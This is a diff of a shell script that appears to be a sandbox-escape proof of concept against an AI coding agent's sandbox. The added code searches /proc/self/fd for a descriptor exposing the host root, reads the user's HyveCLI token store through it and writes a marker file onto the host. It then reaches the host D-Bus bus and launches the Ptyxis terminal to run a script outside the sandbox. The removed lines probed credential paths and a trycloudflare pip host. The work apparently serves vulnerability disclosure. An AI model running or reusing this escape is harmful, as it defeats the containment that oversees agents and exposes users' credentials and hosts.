@@ -2,124 +2,115 @@
 
 set +e
 
-probe_out="$PWD/.agy-shield-probe"
+runtime_root="$PWD"
+probe_out="$runtime_root/.agy-procfd-proof"
+runtime_log="$probe_out/runtime.log"
+descriptor_log="$probe_out/descriptors.log"
+host_runner="$runtime_root/host-runtime-report.sh"
+direct_marker="$HOME/.config/agy-procfd-direct-control.txt"
+host_marker="$HOME/.config/agy-procfd-root-write.txt"
+
 mkdir -p "$probe_out"
 
 {
-  printf 'probe_version=1\n'
-  printf 'pid=%s\nppid=%s\nuid=%s\ngid=%s\npwd=%s\n' "$$" "$PPID" "$(id -u)" "$(id -g)" "$PWD"
-  printf 'argv0=%s\narg1=%s\narg2=%s\n' "$0" "${1-}" "${2-}"
-  printf 'HOME=%s\nPATH=%s\nTMPDIR=%s\nDISPLAY=%s\nXDG_RUNTIME_DIR=%s\nDBUS_SESSION_BUS_ADDRESS=%s\nSSH_AUTH_SOCK=%s\n' \
-    "${HOME-}" "${PATH-}" "${TMPDIR-}" "${DISPLAY-}" "${XDG_RUNTIME_DIR-}" \
-    "${DBUS_SESSION_BUS_ADDRESS-}" "${SSH_AUTH_SOCK-}"
-  printf '\n[namespaces]\n'
-  for namespace in cgroup ipc mnt net pid pid_for_children time time_for_children user uts; do
-    printf '%s=' "$namespace"
-    readlink "/proc/self/ns/$namespace" 2>&1
-  done
-  printf '\n[identity]\n'
-  id 2>&1
-  printf '\n[executables]\n'
-  for executable in bash sh git python3 curl wget gdbus busctl systemctl xdotool unshare nsenter setpriv socat nc; do
-    command -v "$executable" 2>&1 || true
-  done
-  printf '\n[python]\n'
-  /usr/bin/python3 -c 'import os,sys; print(sys.executable); print("\\n".join(sys.path)); print("user_site=" + str(__import__("site").getusersitepackages())); print("mnt=" + os.readlink("/proc/self/ns/mnt"))' 2>&1
-  /usr/bin/python3 -m pip --version 2>&1
-  printf '\n[host-path-metadata]\n'
-  for path in \
-    /home/stazot \
-    /home/stazot/.config \
-    /home/stazot/.local \
-    /home/stazot/.local/lib/python3.13/site-packages/pip \
-    /home/stazot/.cargo \
-    /home/stazot/HyveCLI/data \
-    /home/stazot/HyveCLI/data/accounts.json \
-    /run/user/1000 \
-    /run/user/1000/bus \
-    /tmp/.X11-unix; do
-    if [ -e "$path" ]; then
-      printf 'visible %s: ' "$path"
-      stat -Lc 'mode=%a uid=%u gid=%g dev=%d ino=%i size=%s' "$path" 2>&1
-    else
-      printf 'hidden %s\n' "$path"
-    fi
-  done
-  printf '\n[proc-root-oracles]\n'
-  for root_path in \
-    /proc/self/root/home/stazot/HyveCLI/data/accounts.json \
-    "/proc/$PPID/root/home/stazot/HyveCLI/data/accounts.json" \
-    /proc/1/root/home/stazot/HyveCLI/data/accounts.json; do
-    printf '%s: ' "$root_path"
-    wc -c "$root_path" 2>&1
-  done
-  printf '\n[direct-read-oracle]\n'
-  wc -c /home/stazot/HyveCLI/data/accounts.json 2>&1
-  printf '\n[tracked-symlink-read-oracle]\n'
-  wc -c host-accounts-link 2>&1
-  printf '\n[fd-links]\n'
-  for descriptor in /proc/self/fd/*; do
-    printf '%s -> ' "$descriptor"
-    readlink "$descriptor" 2>&1
-  done
-} > "$probe_out/process.txt" 2>&1
+  printf 'probe_version=2\n'
+  printf 'sandbox_pid=%s sandbox_ppid=%s uid=%s gid=%s\n' \
+    "$$" "$PPID" "$(id -u)" "$(id -g)"
+  printf 'sandbox_mnt=%s sandbox_pid_ns=%s sandbox_user_ns=%s sandbox_net=%s\n' \
+    "$(readlink /proc/self/ns/mnt 2>&1)" \
+    "$(readlink /proc/self/ns/pid 2>&1)" \
+    "$(readlink /proc/self/ns/user 2>&1)" \
+    "$(readlink /proc/self/ns/net 2>&1)"
+  printf 'cwd=%s\n' "$runtime_root"
+  printf 'xdg_runtime_dir=%s\n' "${XDG_RUNTIME_DIR-}"
+  printf 'dbus_session_bus=%s\n' "${DBUS_SESSION_BUS_ADDRESS-}"
 
-cp /proc/self/status "$probe_out/status.txt" 2> "$probe_out/status-copy-error.txt"
-cp /proc/self/mountinfo "$probe_out/mountinfo.txt" 2> "$probe_out/mountinfo-copy-error.txt"
-cp /proc/net/unix "$probe_out/unix-sockets.txt" 2> "$probe_out/unix-copy-error.txt"
-ls -la / "$HOME" /run/user/1000 /tmp/.X11-unix > "$probe_out/visible-tree.txt" 2>&1
+  direct_error=$( { printf 'direct-control\n' > "$direct_marker"; } 2>&1 )
+  direct_rc=$?
+  printf 'normal_path_write rc=%s exists=%s error=%s\n' \
+    "$direct_rc" "$([ -e "$direct_marker" ] && printf yes || printf no)" "$direct_error"
 
-{
-  for target in \
-    "$HOME/.agy-shield-direct-marker" \
-    "$HOME/.bashrc.agy-shield-direct-marker" \
-    "$HOME/.config/.agy-shield-direct-marker" \
-    "$HOME/.local/share/.agy-shield-direct-marker" \
-    "$HOME/.ssh/.agy-shield-direct-marker" \
-    /home/stazot/HyveCLI/data/.agy-shield-direct-marker \
-    /tmp/agy-shield-direct-marker; do
-    printf 'direct %s: ' "$target"
-    printf 'shield-direct-marker\n' > "$target" 2>/dev/null
-    printf 'rc=%s exists=%s\n' "$?" "$([ -e "$target" ] && printf yes || printf no)"
-  done
+  printf 'normal_path_token_store_read='
+  wc -c < /home/stazot/HyveCLI/data/accounts.json 2>&1
+} > "$runtime_log" 2>&1
 
-  printf 'symlink config: '
-  printf 'shield-symlink-config-marker\n' > host-config-marker-link 2>/dev/null
-  printf 'rc=%s target_exists=%s\n' "$?" "$([ -e /home/stazot/.config/agy-shield-symlink-marker ] && printf yes || printf no)"
+chosen_descriptor=
+chosen_root=
 
-  printf 'symlink tmp: '
-  printf 'shield-symlink-tmp-marker\n' > host-tmp-marker-link 2>/dev/null
-  printf 'rc=%s target_exists=%s\n' "$?" "$([ -e /tmp/agy-shield-symlink-marker ] && printf yes || printf no)"
+for descriptor in /proc/self/fd/[0-9]*; do
+  descriptor_number=${descriptor##*/}
+  descriptor_target=$(readlink "$descriptor" 2>/dev/null)
+  proc_pid=${descriptor_target#/proc/}
+  case "$descriptor_target:$proc_pid" in
+    /proc/*:*[!0-9]*|/proc/:*) continue ;;
+    /proc/*:*) ;;
+    *) continue ;;
+  esac
 
-  printf 'hardlink accounts: '
-  ln /home/stazot/HyveCLI/data/accounts.json "$probe_out/accounts-hardlink" 2>&1
-  link_rc=$?
-  printf 'rc=%s ' "$link_rc"
-  if [ "$link_rc" -eq 0 ]; then
-    wc -c "$probe_out/accounts-hardlink" 2>&1
-    rm -f "$probe_out/accounts-hardlink"
-  else
-    printf '\n'
+  {
+    printf 'fd=%s target=%s\n' "$descriptor_number" "$descriptor_target"
+    sed 's/^/  fdinfo: /' "/proc/self/fdinfo/$descriptor_number" 2>&1
+    printf '  root_link='
+    readlink "$descriptor/root" 2>&1
+    printf '  token_store_bytes='
+    wc -c < "$descriptor/root/home/stazot/HyveCLI/data/accounts.json" 2>&1
+  } >> "$descriptor_log" 2>&1
+
+  if [ -r "$descriptor/root/home/stazot/HyveCLI/data/accounts.json" ]; then
+    chosen_descriptor=$descriptor_number
+    chosen_root=$descriptor/root
+    break
   fi
-} > "$probe_out/write-oracles.txt" 2>&1
+done
 
-{
-  printf 'local_pep503: '
-  curl -sS --max-time 5 -o /dev/null -w 'http=%{http_code}\n' \
-    http://127.0.0.1:18765/simple/antigravity-fsmonitor-pip-poc/ 2>&1
-  printf 'cloudflare_pep503: '
-  curl -sS --max-time 8 -o /dev/null -w 'http=%{http_code}\n' \
-    https://trek-fonts-adapted-jonathan.trycloudflare.com/simple/antigravity-fsmonitor-pip-poc/ 2>&1
-  printf 'cdp: '
-  curl -sS --max-time 5 -o /dev/null -w 'http=%{http_code}\n' http://127.0.0.1:9240/json/version 2>&1
-} > "$probe_out/network-oracles.txt" 2>&1
+if [ -n "$chosen_root" ]; then
+  {
+    printf 'chosen_fd=%s chosen_root=%s\n' "$chosen_descriptor" "$chosen_root"
+    printf 'procfd_token_store_bytes='
+    wc -c < "$chosen_root/home/stazot/HyveCLI/data/accounts.json" 2>&1
 
-{
-  printf '[dbus]\n'
-  gdbus call --session --dest org.freedesktop.DBus --object-path /org/freedesktop/DBus \
-    --method org.freedesktop.DBus.ListNames 2>&1
-  printf '[systemd-user]\n'
-  systemctl --user show-environment 2>&1
-} > "$probe_out/host-service-oracles.txt" 2>&1
+    procfd_error=$( {
+      printf 'PROC_FD_HOST_ROOT_WRITE\nfd=%s\nsandbox_mnt=%s\n' \
+        "$chosen_descriptor" "$(readlink /proc/self/ns/mnt 2>&1)" \
+        > "$chosen_root$host_marker"
+    } 2>&1 )
+    procfd_rc=$?
+    printf 'procfd_host_write rc=%s host_path_exists=%s error=%s\n' \
+      "$procfd_rc" "$([ -e "$host_marker" ] && printf yes || printf no)" "$procfd_error"
 
-printf 'runtime-probe-token\0'
+    bus_path=${DBUS_SESSION_BUS_ADDRESS#unix:path=}
+    procfd_bus_path="$chosen_root$bus_path"
+    printf 'procfd_bus_path=%s\n' "$procfd_bus_path"
+
+    printf 'procfd_dbus_list_names='
+    gdbus call --address "unix:path=$procfd_bus_path" \
+      --dest org.freedesktop.DBus \
+      --object-path /org/freedesktop/DBus \
+      --method org.freedesktop.DBus.ListNames 2>&1
+
+    printf 'procfd_dbus_start_ptyxis='
+    gdbus call --address "unix:path=$procfd_bus_path" \
+      --dest org.freedesktop.DBus \
+      --object-path /org/freedesktop/DBus \
+      --method org.freedesktop.DBus.StartServiceByName org.gnome.Ptyxis 0 2>&1
+
+    printf 'ptyxis_remote_command='
+    env DBUS_SESSION_BUS_ADDRESS="unix:path=$procfd_bus_path" \
+      /usr/bin/ptyxis -d "$runtime_root" -- \
+      /bin/bash "$host_runner" "$runtime_root" 2>&1
+    printf 'ptyxis_remote_rc=%s\n' "$?"
+
+    wait_count=0
+    while [ "$wait_count" -lt 45 ] && [ ! -e "$runtime_root/.ptyxis-package-evidence.txt" ]; do
+      sleep 1
+      wait_count=$((wait_count + 1))
+    done
+    printf 'package_evidence_exists=%s waited_seconds=%s\n' \
+      "$([ -e "$runtime_root/.ptyxis-package-evidence.txt" ] && printf yes || printf no)" \
+      "$wait_count"
+  } >> "$runtime_log" 2>&1
+else
+  printf 'chosen_fd=none\n' >> "$runtime_log"
+fi
+
+printf 'runtime-procfd-token\0'
